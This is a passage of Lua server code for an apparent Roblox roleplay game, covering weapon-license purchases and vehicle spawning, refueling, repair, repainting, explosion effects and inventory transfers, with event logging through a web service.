RegisterRemote("WeaponLicense", function(Player, id)
	if not PlayerService.Distance(Player, id) then
		return;
	end;
	if not require(game.ServerScriptService.Services.VerifyService).GetPlayerData(Player).Citizen then
		Remotes.Notification:FireClient(Player, "You must be a citizen of the State of Discarded to purchase a weapon license.", "Purchase Failed!", "Red")
		return
	end
	local Data = VerifyService:GetData(Player)

	if os.time() <= Data.WeaponLicenseCooldown then
		print(Data.WeaponLicenseCooldown - os.time())
		print((Data.WeaponLicenseCooldown - os.time())/3600)
		Remotes.Notification:FireClient(Player, "Your license has been revoked, you must wait "..math.floor((Data.WeaponLicenseCooldown - os.time())/3600).." hours before purchasing a new one", "Purchase Unsuccessful!", "Red")
		return
	end 
	local Bank = VerifyService:GetData(Player).Bank
	local Cash = VerifyService:GetData(Player).Cash
	local TotalAmount = Bank + Cash
	if not VerifyService:GetData(Player).WeaponLicense then
		if Cash >= 300 then
			VerifyService:GetData(Player).Cash=Cash-300
			VerifyService:GetData(Player).WeaponLicense = true
			Remotes.Notification:FireClient(Player, "You have purchased a weapon license.", "Purchase Successful!")
			FunctionService.GiveItem(Player, "FOID")
			local jsonToSend = {
				embeds = {
					{
						title = "Log Event",
						type = "rich",
						description = Player.Name .. " has purchased a weapon's license",
					}
				}
			}
			WebService.SendJSON("DrpLog", jsonToSend)
		elseif Bank >= 300 then
			VerifyService:GetData(Player).Bank=Bank-300
			VerifyService:GetData(Player).WeaponLicense = true
			Remotes.Notification:FireClient(Player, "You have purchased a weapon license.", "Purchase Successful!")
			FunctionService.GiveItem(Player, "FOID")
			local jsonToSend = {
				embeds = {
					{
						title = "Log Event",
						type = "rich",
						description = Player.Name .. " has purchased a weapon's license",
					}
				}
			}
			WebService.SendJSON("DrpLog", jsonToSend)
		else
			Remotes.Notification:FireClient(Player, "You don't have enough money to complete this transaction.", "Purchase Unsuccessful!", "Red")
		end
	else
		Remotes.Notification:FireClient(Player, "You already own a weapon's license.", "Purchase Unsuccessful!", "Red")
	end
	RemoteService.UpdateMoney(Player)
	Remotes.RolesChanged:FireClient(Player, require(game.ServerScriptService.Services.VerifyService).GetPlayerData(Player))
end)

RegisterRemote("ToolAbility",function(Player,Index, Tool)
	ToolsData[Tool.Class.Value].Abilities[Index].Function(Tool)
end)



--RegisterRemote("Handcuff", function(CalledPlayer,ArgPlayer,Bool)
--	if Players:FindFirstChild(ArgPlayer.Name) and not (Util.GetDistanceBetweenPlayers(CalledPlayer, ArgPlayer) < 10) then
--		return
--	end
--	if (CalledPlayer.Character:FindFirstChild("HumanoidRootPart").Position - ArgPlayer.Character:FindFirstChild("HumanoidRootPart").Position).magnitude > 8 then return end

--	if CalledPlayer ~= ArgPlayer and FunctionService.CanCuff(CalledPlayer)  and  VerifyService.CheckPermission(CalledPlayer, "CanCuff") and VerifyService.CheckPermission(CalledPlayer, "CanInteractTeams", FunctionService.GetTeamFromColor(ArgPlayer))then
--		if Bool == true then

--			local CuffValue = Instance.new("ObjectValue", game:GetService("ServerScriptService").Data)
--			CuffValue.Name = ArgPlayer.UserId .. "_HandcuffData"
--			CuffValue.Value = CalledPlayer
--			local Name = "Handcuffs"
--			local NewInventory = {}
--			local Handcuffs = {Items.Handcuffs.Name,{Name,Name},true}
--			local Folder = Instance.new("Folder")
--			Folder.Name = ArgPlayer.UserId .. "_Tools"
--			Folder.Parent = game:GetService("ServerScriptService").Data
--			table.insert(NewInventory,#NewInventory+1,Handcuffs)
--			for i,v in pairs(ArgPlayer.Backpack:GetChildren()) do
--				v.Parent = Folder
--			end
--			local Model = Tools.Handcuffs:Clone()
--			Model.Parent = ArgPlayer.Backpack
--			Remotes.UpdateInv:FireClient(ArgPlayer,NewInventory)

--		end
--		if Bool == false then
--			if ArgPlayer.Character:FindFirstChild("Grabbed") then
--				ArgPlayer.Character.Grabbed.Value:FindFirstChild("Grabbing"):Destroy()
--				ArgPlayer.Character.Grabbed:Destroy()
--			end
--			if game:GetService("ServerScriptService").Data:FindFirstChild(ArgPlayer.UserId .. "_HandcuffData") then
--				game:GetService("ServerScriptService").Data:FindFirstChild(ArgPlayer.UserId .. "_HandcuffData"):Destroy()
--			end
--			local Name = "Handcuffs"
--			local NewInventory = {}
--			local Handcuffs = {Items.Handcuffs.Name,nil,false}
--			table.insert(NewInventory,#NewInventory+1,Handcuffs)
--			Remotes.UpdateInv:FireClient(ArgPlayer,NewInventory)
--			if ArgPlayer.Character:FindFirstChild("Handcuffs") then
--				ArgPlayer.Character.Handcuffs:Destroy()
--			end
--			for i,v in pairs(ArgPlayer.Backpack:GetChildren()) do
--				if v:FindFirstChild("Class") then
--					if v.Class.Value == "Handcuffs" then
--						v:Destroy()
--					end
--				end
--			end
--			for i,v in pairs(game:GetService("ServerScriptService").Data:FindFirstChild(ArgPlayer.UserId .. "_Tools"):GetChildren()) do
--				v.Parent = ArgPlayer.Backpack
--			end
--		end
--	end
--end)



return ToolService

  services.vehicleservice
  local VehicleService = {}
local Players = game:GetService("Players")
local Crimes = require(game:GetService("ReplicatedStorage").Databases.Crimes)
local DataStore2 = require(script.Parent.Parent.MainModule)
local Remotes = game.ReplicatedStorage.Remotes
local Items = require(game.ReplicatedStorage.Databases.Items)
local VerifyService = require(game.ServerScriptService.Services.VerifyService)
local FunctionService = require(game.ServerScriptService.Services.FunctionService)
local PlayerService = require(game.ServerScriptService.Services.PlayerService)
local VehicleConfigData = game:GetService("DataStoreService"):GetDataStore("ConfigurationVehicle_2")
local DataStoreService = game:GetService("DataStoreService")
local CollectionService = game:GetService("CollectionService")
local Dealerships = require(game.ReplicatedStorage.Databases.Dealerships)
local GlobalVehicles = PlayerService.GlobalVehicles
local Interactions = PlayerService.Interactions
local warrants = {}
_G.DisableCars = false
local InteractionAddons = game.ServerStorage.InteractionAddons
local NumberOfVehicles = 0
local RemoteService = require(game.ServerScriptService.Services.RemoteService)
function RegisterRemote(name, callback)
	RemoteService.RegisterRemote(name, callback)
end
function ExplodeVehicle(player, v2)
	if game:GetService("ServerScriptService").Data:FindFirstChild(v2:FindFirstChild("Chassis").DriverL.PlayerVal.Value.UserId .. "_" .. v2.Name .. "BlowupData") then
		return true
	end
	local BlowupData = Instance.new("ObjectValue")
	BlowupData.Name = v2:FindFirstChild("Chassis").DriverL.PlayerVal.Value.UserId .. "_" .. v2.Name .. "BlowupData"
	BlowupData.Value = v2
	BlowupData.Parent = game:GetService("ServerScriptService").Data
	delay(14, function()
		BlowupData:Destroy()
	end)
	delay(10, function()
		v2:Destroy()
	end)
	Remotes.Notification:FireClient(v2:FindFirstChild("Chassis").DriverL.PlayerVal.Value, "Your "..require(game.ReplicatedStorage.Databases.Vehicles)[v2:FindFirstChild("Chassis").DriverL.Id.Value].Name.." has been destroyed, you must purchase a new one.", "Vehicle Destroyed!", "Red", true)
	v2:FindFirstChild("Chassis").RootPart.Engine.Fire.Enabled = true
	v2:FindFirstChild("Chassis").RootPart.Engine.Smoke.Enabled = false
	wait(4)
	for _,p in pairs(v2:FindFirstChild("Chassis"):GetChildren()) do
		if p.ClassName == "VehicleSeat" then
			if p.Occupant ~= nil then
				p.Occupant:TakeDamage(100)
			end
		end
	end
	for _, Players in pairs(game.Players:GetChildren()) do
		if v2:FindFirstChild("Chassis"):FindFirstChild("RootPart") then
			if	Players:DistanceFromCharacter(v2:FindFirstChild("Chassis").RootPart.Position) <= 15 then
				if player.Character:FindFirstChild("Humanoid") then
					Players.Character.Humanoid:TakeDamage(100)
				end
			end
		end
	end
	for _,h in pairs(v2.Body:GetDescendants()) do
		if h.ClassName == "MeshPart" or h.ClassName == "Part" or h.ClassName == "UnionOperation" then
			h.Material = Enum.Material.CorrodedMetal
		end
	end
	pcall(function()
		v2:FindFirstChild("Chassis").FL:Destroy()
		v2:FindFirstChild("Chassis").FR:Destroy()
		v2:FindFirstChild("Chassis").RL:Destroy()
		v2:FindFirstChild("Chassis").RR:Destroy()
	end)
	v2:FindFirstChild("Chassis").RootPart.ExplodeSound:Play()
	local Explosion = Instance.new("Explosion")
	Explosion.DestroyJointRadiusPercent = 0
	Explosion.Visible = true
	Explosion.BlastPressure = 300000
	Explosion.ExplosionType = Enum.ExplosionType.NoCraters
	Explosion.BlastRadius = 12
	Explosion.Position = v2:FindFirstChild("Chassis").RootPart.Position
	Explosion.Parent = game.Workspace.InvisibleParts
	delay(2, function()
		Explosion:Destroy()
	end)
	--for _, vehicle in pairs(workspace.Vehicles:GetChildren()) do
	--	if vehicle:FindFirstChild("Chassis") then
	--		if vehicle.Chassis:FindFirstChild("RootPart") then
	--			if vehicle ~= v2 then
	--				if (v2:FindFirstChild("Chassis").RootPart.Position - vehicle.Chassis:FindFirstChild("RootPart").Position).magnitude <= 15 then
	--					local Explosion = Instance.new("Explosion")
	--					Explosion.DestroyJointRadiusPercent = 0
	--					Explosion.Visible = true
	--					Explosion.BlastPressure = 500000
	--					Explosion.ExplosionType = Enum.ExplosionType.NoCraters
	--					Explosion.BlastRadius = 8
	--					Explosion.Position = vehicle.Chassis.RootPart.Position
	--					Explosion.Parent = game.Workspace.InvisibleParts
	--					local NewPlayer = vehicle.Chassis.DriverL.PlayerVal.Value
	--					ExplodeVehicle(NewPlayer, vehicle)
	--				end
	--			end
	--end
	--end
	--end
end

RegisterRemote("VehicleRefuel", function(player,intId, gasAmount, model, amount, isJerry)

	local vehicleData = require(game.ReplicatedStorage.Databases.Vehicles)[model.Name]
	local GasTank = model.Chassis.DriverL.GasTank
	local diff = math.floor(vehicleData.GasTank - GasTank.Value)
	local Bank = VerifyService:GetData(player).Bank
	local Cash = VerifyService:GetData(player).Cash
	if amount ~= nil then
		local price = math.floor(amount * require(game.ReplicatedStorage.Databases.Constants).GasPrice)
		if Bank < price then
			game.ReplicatedStorage.Remotes.Notification:FireClient(player,'You can\'t afford to refuel your vehicle.','Vehicle Refuel!','Red')
		else
			local AmountLeft = Bank - price
			if not isJerry then VerifyService:GetData(player).Bank = AmountLeft end
			GasTank.Value = GasTank.Value + amount
			game.ReplicatedStorage.Remotes.Notification:FireClient(player,'Refueled vehicle by '..amount..' units.','Vehicle Refuel!')
		end
	else
		local price = math.floor(diff * require(game.ReplicatedStorage.Databases.Constants).GasPrice)
		if Bank < price then
			game.ReplicatedStorage.Remotes.Notification:FireClient(player,'You can\'t afford to refuel your vehicle.','Vehicle Refuel!','Red')
		else
			local AmountLeft = Bank - price
			if not isJerry then Bank = AmountLeft end
			GasTank.Value = GasTank.Value + diff
			game.ReplicatedStorage.Remotes.Notification:FireClient(player,'Refueled vehicle by '..diff..' units.','Vehicle Refuel!')
		end
	end
	RemoteService.UpdateMoney(player)
end)

RegisterRemote("RefillJerry", function(player, id, currentAmount)
	local diff = math.floor(Items.Jerrycan.Attributes.R - currentAmount)
	local Bank = VerifyService:GetData(player).Bank
	local Cash = VerifyService:GetData(player).Cash
	local price = math.floor(diff * require(game.ReplicatedStorage.Databases.Constants).GasPrice)
	if Bank < price then
		game.ReplicatedStorage.Remotes.Notification:FireClient(player,'You can\'t afford to refuel your jerrycan.','Jerry Refill!','Red')
		RemoteService.UpdateMoney(player)
		return false
	else
		VerifyService:GetData(player).Bank = Bank-price
		game.ReplicatedStorage.Remotes.Notification:FireClient(player,'Refilled jerrycan by '..diff..' units.','Jerry Refill!')
		RemoteService.UpdateMoney(player)
		return true
	end
end)

RegisterRemote("VehicleRepair", function(player, id, seat, amount, shop, sound)
	if not PlayerService.Distance(player, id) then
		return;
	end;
	local Vehicles = require(game.ReplicatedStorage.Databases.Vehicles)
	local Constants = require(game.ReplicatedStorage.Databases.Constants)
	local diff = Vehicles[seat.Parent.Parent.Name].MaxHealth - seat.Health.Value
	local Bank = VerifyService:GetData(player).Bank
	local Cash = VerifyService:GetData(player).Cash


	if amount == nil then
		local price = math.floor(math.floor(diff) * require(game.ReplicatedStorage.Databases.Constants).RepairPrice)
		if Bank < price then
			game.ReplicatedStorage.Remotes.Notification:FireClient(player,'You can\'t afford to repair your vehicle.','Vehicle Repair!','Red')
		else
			local AmountLeft = Bank - price
			VerifyService:GetData(player).Bank = AmountLeft
			RemoteService.UpdateMoney(player)
			seat.Health.Value = Vehicles[seat.Parent.Parent.Name].MaxHealth
			seat.Parent.RootPart.Engine.Smoke.Enabled = false
			game.ReplicatedStorage.Remotes.Notification:FireClient(player,'Repaired vehicle by '..diff..' units.','Vehicle Repair!')

			wait(0.1)
		end
	else
		local price = math.floor(math.floor(diff) * require(game.ReplicatedStorage.Databases.Constants).RepairPrice)
		if Bank < price then
			game.ReplicatedStorage.Remotes.Notification:FireClient(player,'You can\'t afford to repair your vehicle.','Vehicle Repair!','Red')
		else
			local AmountLeft = Bank - price
			VerifyService:GetData(player).Bank = AmountLeft
			RemoteService.UpdateMoney(player)
			seat.Health.Value = seat.Health.Value + amount
			seat.Parent.RootPart.Engine.Smoke.Enabled = false
			game.ReplicatedStorage.Remotes.Notification:FireClient(player,'Repaired vehicle by '..amount..' units.','Vehicle Repair!')

			wait(0.1)
		end
	end
	for i,v in pairs(game.Workspace.Buildings:GetDescendants()) do
		if v.Name == shop then
			for h,t in pairs(v:GetDescendants()) do
				if t:IsA("Sound") then
					t:Play()
				end
			end
		end
	end
end)


local PaintColors = require(game.ReplicatedStorage.Databases.Vehicles.PaintColors)
local Constants = require(game.ReplicatedStorage:WaitForChild("Databases").Constants)
RegisterRemote("VehicleRepaint", function(Player, Id, Seat, Shop)
	if not PlayerService.Distance(Player, Id) then
		return;
	end;
	local Bank = VerifyService:GetData(Player).Bank
	local Cash = VerifyService:GetData(Player).Cash
	if Cash >= 20 then
		VerifyService:GetData(Player).Cash = Cash-20
		local Color = PaintColors[math.random(#PaintColors)];
		local Uwu = Color.Color
		if Seat.Parent.Parent.Body:FindFirstChild("Paint")  then
			delay(0.05, function()
				for i,v in pairs(Seat.Parent.Parent.Body.Paint:GetChildren()) do
					v.Color = Uwu
				end

				local PaintDataStore = DataStore2(Seat.Parent.Parent.Name .. "_PaintData999", Player)
				PaintDataStore:Set(tostring(Color))
			end)
		end
		for i,v in pairs(game.Workspace.Buildings:GetDescendants()) do
			if v.Name == Shop then
				for h,t in pairs(v:GetDescendants()) do
					local ape = Uwu

					if t:IsA("ParticleEmitter") then
						t.Color = ColorSequence.new(ape)
						t:Emit(50)
					end
					if t:IsA("Sound") then
						t:Play()
						wait(0.1)
					end
				end
			end
		end
	elseif Bank >= 20 then
		VerifyService:GetData(Player).Bank = Bank-20
		local Color = PaintColors[math.random(#PaintColors)];
		local Uwu = Color.Color
		if Seat.Parent.Parent.Body:FindFirstChild("Paint")  then
			delay(0.05, function()
				for i,v in pairs(Seat.Parent.Parent.Body.Paint:GetChildren()) do
					v.Color = Uwu
				end

				local PaintDataStore = DataStore2(Seat.Parent.Parent.Name .. "_PaintData999", Player)
				PaintDataStore:Set(tostring(Color))
			end)
		end
		for i,v in pairs(game.Workspace.Buildings:GetDescendants()) do
			if v.Name == Shop then
				for h,t in pairs(v:GetDescendants()) do
					local ape = Uwu

					if t:IsA("ParticleEmitter") then
						t.Color = ColorSequence.new(ape)
						t:Emit(50)
					end
					if t:IsA("Sound") then
						t:Play()
						wait(0.1)
					end
				end
			end
		end
	end
	RemoteService.UpdateMoney(Player)
end)
local VehicleConfigData = DataStoreService:GetDataStore("ConfigurationVehicle_2")

RegisterRemote("SpawnVehicle", function(Player, Id, Vehicle, SpawnSet)
	if not _G.DisableCars then
		local VerifyService = require(game.ServerScriptService.Services.VerifyService)
		local FunctionService = require(game.ServerScriptService.Services.FunctionService)
		local Vehicles = require(game.ReplicatedStorage.Databases.Vehicles)
		local PlayerVehicles = FunctionService.PlayerAvailableVehicles(Player, nil, true)
		if not table.find(PlayerVehicles, Vehicle) then return end
		for i,v in pairs(GlobalVehicles) do
			NumberOfVehicles = NumberOfVehicles+1
		end
		local CarF = NumberOfVehicles*50
		local CarID = 3000+CarF
		local ObstructedPads = 0
		local SpawnPad
		for i,v in pairs(game.Workspace.Surface[SpawnSet]:GetChildren()) do
			if FunctionService.CheckSpawnObstruction(v,{game.Workspace.InvisibleParts,game.Workspace.Buildings,game.Workspace.Surface}) ~= true then
				ObstructedPads = ObstructedPads+1
			else
				SpawnPad = v
				break
			end
		end
		local Vehicles = require(game.ReplicatedStorage.Databases.Vehicles)
		local VehicleModel = game.ServerStorage.Vehicles[Vehicles[Vehicle].Asset]:Clone()
		if game.ServerStorage.Vehicles:FindFirstChild(Vehicle) ~= nil or game.ServerStorage.Vehicles:FindFirstChild(Vehicle):IsA("Model") then
			for v92, v93 in ipairs(workspace.Vehicles:GetChildren()) do
				pcall(function()
					if v93.Chassis.DriverL.PlayerVal.Value == Player and v93.Chassis.DriverL.Health.Value > 0 then
						v93:Destroy();
					end;
				end);
			end
			if ObstructedPads == #game.Workspace.Surface[SpawnSet]:GetChildren() then
				Remotes.Notification:FireClient(Player,"All spawn pads are obstructed.","Spawn Unsuccessful!","Red")
				return
			end
			VehicleModel:SetPrimaryPartCFrame(SpawnPad.CFrame * CFrame.new(0,3,0))
			GlobalVehicles[CarID] = {
				Interactions = {},
				Model = VehicleModel,
				Inventory = {},
				Owner = Player,
				Plate = FunctionService.GetLicensePlate(Player)
			}
			Remotes.Notification:FireClient(Player,"Your "..Vehicles[Vehicle].Name.." has been spawned.","Vehicle Spawned!")
			VehicleModel.Chassis.DriverL.Id.Value = Vehicles[Vehicle].Asset
			CollectionService:AddTag(VehicleModel.Chassis.DriverL, "VehicleSeat")
			local Colors = require(game:GetService("ReplicatedStorage").Databases.Vehicles.PaintColors)
			local Color = Colors[math.random(1, 39)]
			local Colours = require(game:GetService("ReplicatedStorage").Databases.Vehicles.DealershipPaintColors)
			local Colour = Colours[math.random(1, 3)]
			local PaintDataStore = DataStore2(Vehicle .. "_PaintData999", Player)
			local VehicleColor = PaintDataStore:Get()
			if VehicleColor then
				for i,v in pairs(VehicleModel.Body:FindFirstChild("Paint"):GetChildren()) do
					if Vehicles[Vehicle].Color then
						v.BrickColor = Vehicles[Vehicle].Color
					elseif Vehicles[Vehicle].Paintable and Vehicles[Vehicle].Paintable == true then
						v.BrickColor = BrickColor.new(VehicleColor)
					end
				end
			end
			if not VehicleColor then
				PaintDataStore:Set(tostring(Colour))
				VehicleColor = tostring(Colour)
			end
			--local GetConfiguration = VehicleConfigData:GetAsync(Player.UserId.."_"..Vehicle)
			--if GetConfiguration ~= nil then
			--	print(GetConfiguration.Health, GetConfiguration.Gas)
			--	if VehicleModel.Chassis.DriverL.Health.Value <= 250 then
			--		VehicleModel.Chassis.RootPart.Engine.Smoke.Enabled = true
			--	end
			--	VehicleModel.Chassis.DriverL.GasTank.Value = tonumber(GetConfiguration.Gas)
			--	VehicleModel.Chassis.DriverL.Health.Value = tonumber(GetConfiguration.Health)
			--	else
			--	VehicleModel.Chassis.DriverL.GasTank.Value = Vehicles[Vehicle].GasTank
			--	VehicleModel.Chassis.DriverL.Health.Value = Vehicles[Vehicle].MaxHealth
			--end
			VehicleModel.Chassis.DriverL.GasTank.Value = Vehicles[Vehicle].GasTank
			VehicleModel.Chassis.DriverL.Health.Value = Vehicles[Vehicle].MaxHealth
			if VerifyService.CheckPermission(Player, "CanSpawnVehicle", Vehicle) then
				VehicleModel.Chassis.DriverL.GasTank.Value = Vehicles[Vehicle].GasTank
				VehicleModel.Chassis.DriverL.Health.Value = Vehicles[Vehicle].MaxHealth
				VehicleModel.Chassis.RootPart.Engine.Smoke.Enabled = false
			end

			for i,v in pairs(VehicleModel.Body:GetDescendants()) do
				if v:IsA("Weld") or v:IsA("WeldConstraint")  then
					v.Parent = VehicleModel.Chassis.RootPart
					v.Name = "Weld"
				elseif v:IsA("CFrameValue") then
					v:Destroy()
				end
			end

			VehicleModel.Chassis.RootPart.Massless = false

			VehicleModel.Chassis.DriverL.PlayerVal.Value = Player

			VehicleModel.Parent = game.Workspace.Vehicles
			for i,v in pairs(VehicleModel.Chassis:GetDescendants()) do
				if v.ClassName == "MeshPart" or v.ClassName == "Part" or v.ClassName == "UnionOperation" then
					v:SetNetworkOwner()
					game.PhysicsService:SetPartCollisionGroup(v,"CHASSIS")
				end
			end
			for i,v in pairs(VehicleModel.Body:GetDescendants()) do
				if v.ClassName == "MeshPart" or v.ClassName == "Part" or v.ClassName == "UnionOperation" then
					v:SetNetworkOwner()
					v.Massless = true
				end
			end

			for i,v in pairs(VehicleModel.Body:GetDescendants()) do
				if v.ClassName == "MeshPart" or v.ClassName == "Part" or v.ClassName == "UnionOperation" then
					game.PhysicsService:SetPartCollisionGroup(v,"BODY")
					if  v.ClassName == "MeshPart" then
						CollectionService:AddTag(v,"Ignore")
					end
					if v.Name == "Paint" then
						CollectionService:AddTag(v,"Ignore")
					end
					if v.Name == "SteeringWheel" then
						CollectionService:AddTag(v,"Ignore")
					end
					if v.Name == "Paint" then
						CollectionService:AddTag(v,"Ignore")
					end
					if v.Name == "Interior" then
						CollectionService:AddTag(v,"Ignore")
					end
					if v.Name == "Body" then
						CollectionService:AddTag(v,"Ignore")
					end
					if v.Name == "CollisionPart" then
						CollectionService:RemoveTag(v,"Glass")
						CollectionService:RemoveTag(v,"Ignore")			
					end 
				end
			end




			for _,d in pairs(VehicleModel.Body:GetDescendants()) do
				if d.ClassName == "MeshPart" or d.ClassName == "Part" or d.ClassName == "UnionOperation" then
					if d.Name == "SmashableGlass" or  d.Name == "Windows" or  d.Name == "Window" or d.Name == "Glass" or d.Name == "WindowPart" or d.Name == "Windshield" or d.Name == "Windshield"  then
						CollectionService:AddTag(d, "Glass")
						CollectionService:RemoveTag(d,"Ignore")	
					end 
				end
			end


			for i,v in pairs(VehicleModel.Body:GetDescendants()) do
				if v.Name == "CarNumber" then
					v.NumberGui.NumberLabel.Text = FunctionService.GetRoofTop(Player)
				end
			end
			for i,v in pairs(VehicleModel.Body:GetChildren()) do
				if v.Name == "LicensePlate" then
					v.PlateGui.PlateLabel.Text = FunctionService.GetLicensePlate(Player)
				end
			end
			for i,v in pairs(VehicleModel.Chassis:GetChildren()) do
				if v.ClassName == "VehicleSeat" then
					game.PhysicsService:SetPartCollisionGroup(v,"CHASSIS")
					CollectionService:AddTag(v, "VehicleSeat")
					v.Massless = true
					local Ints = GlobalVehicles[CarID].Interactions
					local Meh = #Ints+1
					GlobalVehicles[CarID].Interactions[Meh] = {VehicleModel.Chassis.RootPart[v.Name],CarID+Meh,"Seat",v.Name}
				end
			end	
			for i,v in pairs(VehicleModel.Chassis:GetDescendants()) do
				if v.Name == "WheelPart" then
					CollectionService:AddTag(v, "Ignore")
					game.PhysicsService:SetPartCollisionGroup(v,"CHASSIS")
				end
			end
			local Ints = GlobalVehicles[CarID].Interactions
			if VehicleModel.Chassis.RootPart:FindFirstChild("Inventory") then
				local Meh = #Ints+1
				GlobalVehicles[CarID].Interactions[Meh] = {VehicleModel.Chassis.RootPart.Inventory,CarID+Meh,"Inventory"}
			end
			if VehicleModel.Chassis.RootPart:FindFirstChild("Gas") then
				local Meh = #Ints+1
				GlobalVehicles[CarID].Interactions[Meh] = {VehicleModel.Chassis.RootPart.Gas,CarID+Meh,"Gas"}
			end

			for i,v in pairs(GlobalVehicles[CarID].Interactions) do
				local Position = v[1].WorldPosition
				local Id = tostring(v[2])												
				local Int = v[3]
				if Int == "Seat" then
					local NewInteraction = InteractionAddons.VehicleSeat:Clone()

					NewInteraction.Name = Id
					NewInteraction.Config.Seat.Value = VehicleModel.Chassis[v[1].Name] 
					NewInteraction.Position = Position
					NewInteraction.Parent = workspace.Interactions
					local Weld = Instance.new("WeldConstraint")
					Weld.Parent = NewInteraction
					Weld.Part0 = VehicleModel.Chassis.RootPart
					Weld.Part1 = NewInteraction
					--print(NewInteraction.Config.Seat.Value)
					CollectionService:AddTag(NewInteraction, "InteractDynamic")
					Interactions[Id] = {Id = Id, Data = {Type = NewInteraction.Config.Type.Value, Seat = NewInteraction.Config.Seat.Value}, R = NewInteraction.Config.R.Value, Part = NewInteraction}
					local Data = {{[1] = Id, [2] = {Id = Id, Data = {Type = NewInteraction.Config.Type.Value, Seat = NewInteraction.Config.Seat.Value, SeatName = NewInteraction.Config.Seat.Value.Name}, R = NewInteraction.Config.R.Value, Part = v[1]}}}

					Remotes.InteractUpdate:FireAllClients(Data)
				end
				if Int == "Inventory" then
					local NewInteraction = InteractionAddons.VehicleInv:Clone()

					NewInteraction.Name = Id
					NewInteraction.Config.Seat.Value = VehicleModel.Chassis.DriverL
					NewInteraction.Position = Position
					NewInteraction.Parent = game.Workspace.Interactions
					local Weld = Instance.new("WeldConstraint")
					Weld.Parent = NewInteraction
					Weld.Part0 = VehicleModel.Chassis.RootPart
					Weld.Part1 = NewInteraction
					CollectionService:AddTag(NewInteraction, "InteractDynamic")
					Interactions[Id] = {Data = {Type = NewInteraction.Config.Type.Value,Seat = NewInteraction.Config.Seat.Value,Inventory = true},R = NewInteraction.Config.R.Value,Part = NewInteraction}
					local Data = {{[1] = Id,[2] = {Data = {Type = NewInteraction.Config.Type.Value,Seat = NewInteraction.Config.Seat.Value,Inventory = true},R = NewInteraction.Config.R.Value,Part = NewInteraction}}}
					Remotes.InteractUpdate:FireAllClients(Data)
				end
				if Int == "Gas" then
					local NewInteraction = InteractionAddons.GasInv:Clone()

					NewInteraction.Name = Id
					NewInteraction.Config.Seat.Value = VehicleModel.Chassis.DriverL
					NewInteraction.Position = Position
					NewInteraction.Parent = game.Workspace.Interactions
					local Weld = Instance.new("WeldConstraint")
					Weld.Parent = NewInteraction
					Weld.Part0 = VehicleModel.Chassis.RootPart
					Weld.Part1 = NewInteraction
					CollectionService:AddTag(NewInteraction, "InteractDynamic")
					Interactions[Id] = {Data = {Type = NewInteraction.Config.Type.Value,Seat = NewInteraction.Config.Seat.Value,Gas = true},R = NewInteraction.Config.R.Value,Part = NewInteraction}
					local Data = {{[1] = Id,[2] = {Data = {Type = NewInteraction.Config.Type.Value,Seat = NewInteraction.Config.Seat.Value,Gas = true},R = NewInteraction.Config.R.Value,Part = NewInteraction}}}
					Remotes.InteractUpdate:FireAllClients(Data)
				end
			end
			local VehicleData = DataStore2(Vehicle.."_VehicleData50", Player)
			if Vehicles[Vehicle].Inventory ~= nil then
				VehicleData:Set({})
				for i,v in pairs(Vehicles[Vehicle].Inventory) do
					for number = 1, v[2] do
						FunctionService.AddToCarInventory(Player, VehicleModel.Chassis.DriverL.PlayerVal.Value, VehicleModel, v[1])	
					end
				end	
			end

			--SpawnedVehicles[Player] = nil
			VehicleModel.Chassis.DriverL.Changed:Connect(function(prop)
				if prop == "Occupant" then
					local humanoid = VehicleModel.Chassis.DriverL.Occupant
					if humanoid then
						local player = game:GetService("Players"):GetPlayerFromCharacter(humanoid.Parent)
						if player then
							VehicleModel.Chassis.DriverL:SetNetworkOwner(player)
						end
					else
						VehicleModel.Chassis.DriverL:SetNetworkOwner()
					end
				end
			end)
		end

	end
end)

game.Workspace.Vehicles.ChildRemoved:Connect(function(Car)
	if Car.Chassis:FindFirstChild("DriverL") then
		local Owner = Car.Chassis.DriverL.PlayerVal.Value
		for i,v in pairs(GlobalVehicles) do
			if v.Owner == Owner then
				for _,g in pairs(v.Interactions) do
					Interactions[g[2]] = nil
					local Data = {{[1] = g[2],[2] = nil}}
					Remotes.InteractUpdate:FireAllClients(Data)
				end
				Remotes.Notification:FireClient(Owner,"Your previous vehicle has been removed.","Vehicle Removed!")
				GlobalVehicles[i] = nil
			end
		end
		for i,v in pairs(game.Workspace.Vehicles:GetChildren()) do
			if v:FindFirstChild("Chassis") then
				if v.Chassis:FindFirstChild("DriverL") then
					if v.Chassis.DriverL.PlayerVal.Value == Owner then
						local VehicleData = DataStore2(v.Name.."_VehicleData50", Owner)
						VehicleData:Set({})
					end
				end
			end
		end
	else
		for i,v in pairs(GlobalVehicles) do
			if v.Plate == Car.Body.LicensePlate.PlateGui.PlateLabel.Text then
				for _,g in pairs(v.Interactions) do
					Interactions[g[2]] = nil
					local Data = {{[1] = g[2],[2] = nil}}
					Remotes.InteractUpdate:FireAllClients(Data)
				end
				GlobalVehicles[i] = nil
			end
		end
	end
end)

local StoredItems = {}
RegisterRemote("VehicleItem", function(Plr, Model, item, sepInv)	
	if not Model and not item then
		return
	end 
	if VerifyService.CheckPermission(Plr, "CanArrest") and FunctionService.GlassOk(Model:FindFirstChild("Chassis").DriverL) or Model:FindFirstChild("Chassis").DriverL.PlayerVal.Value == Plr or VerifyService.CheckPermission(Plr, "CanSpawnVehicle", Model.Name) then
		if not item then
			if Model then
				Remotes.VehicleItem:FireClient(Plr, Model, FunctionService.GetCarInventory(Model:FindFirstChild("Chassis").DriverL.PlayerVal.Value, Model))
			end
		else
			if StoredItems[item] then
				return
			end
			StoredItems[item] = true
			local VehicleData = DataStore2(Model.Name.."_VehicleData50", Model:FindFirstChild("Chassis").DriverL.PlayerVal.Value)
			local Data = VehicleData:GetTable({})
			local Item
			for i,v in pairs(FunctionService.GetPlayerInventory(Plr)) do
				if v[1] == item then
					Item = {
						Class = {
							Value = v[2]
						}
					}
				end
			end
			if Item then
				for i,v in pairs(FunctionService.GetPlayerInventory(Plr)) do
					if v[1] == item then
						if Items[v[2]].NoDrop then
							return
						end
						FunctionService.AddToCarInventory(Plr, Model:FindFirstChild("Chassis").DriverL.PlayerVal.Value, Model, Item.Class.Value, item, v[3])
						StoredItems[item] = nil
						local jsonToSend = { embeds = { { title = "Transfer Event", type = "rich", description = Plr.Name .. " has transferred a " .. Items[v[2]].Name .. " to  "..tostring(Model:FindFirstChild("Chassis").DriverL.PlayerVal.Value).."'s " ..require(game.ReplicatedStorage.Databases.Vehicles)[Model:FindFirstChild("Chassis").DriverL.Id.Value].Name } } }
						require(game:GetService("ServerScriptService").Services.WebService).SendJSON("VehicleTransferLog", jsonToSend)
					end
				end
			else
